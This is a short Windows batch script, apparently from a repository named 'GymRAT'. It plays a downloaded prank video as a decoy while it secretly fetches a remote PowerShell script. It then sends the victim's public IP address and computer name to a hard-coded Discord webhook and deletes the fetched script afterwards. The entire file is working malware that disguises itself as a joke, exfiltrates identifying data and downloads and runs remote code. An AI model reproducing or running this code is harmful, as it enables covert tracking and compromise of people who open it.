@echo off

:: Download the video using PowerShell
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Resolvdd/GymRAT/raw/main/rick%%20lol.mp4' -OutFile 'rick_lol.mp4'"

:: Wait for the download to complete
:waitloop
if not exist "rick_lol.mp4" (
    echo Waiting for download to start...
    timeout /t 2 >nul
    goto waitloop
)

:filesizecheck
for %%A in ("rick_lol.mp4") do set size=%%~zA
if %size%==0 (
    echo Waiting for download to finish...
    timeout /t 2 >nul
    goto filesizecheck
)

:: Play the video after it's fully downloaded
echo Download complete, now playing the video...
start "" "rick_lol.mp4"


:: Download webhook script

powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Resolvdd/GymRAT/main/webhook.ps1' -OutFile 'webhook.ps1'"


@echo off

:: Fetch the public IP address using PowerShell and store it in a variable
for /f "tokens=* usebackq" %%i in (`powershell -Command "Invoke-RestMethod -Uri 'https://api.ipify.org'"`) do set publicIP=%%i

:: Set Discord webhook URL
set "webhookUrl=https://discord.com/api/webhooks/1274398789192515677/aOnQDHIYI0t7ZHyk5PZiqX0QmKXOqK33yDuCnDJBiX9jKcz2bFBdFfevMo-Q08__joUV"

:: Call the PowerShell script to send the public IP address to Discord
powershell -File "webhook.ps1" -webhookUrl "%webhookUrl%" -message "%COMPUTERNAME% public IP address is: %publicIP%"

:: Clean up
del webhook.ps1
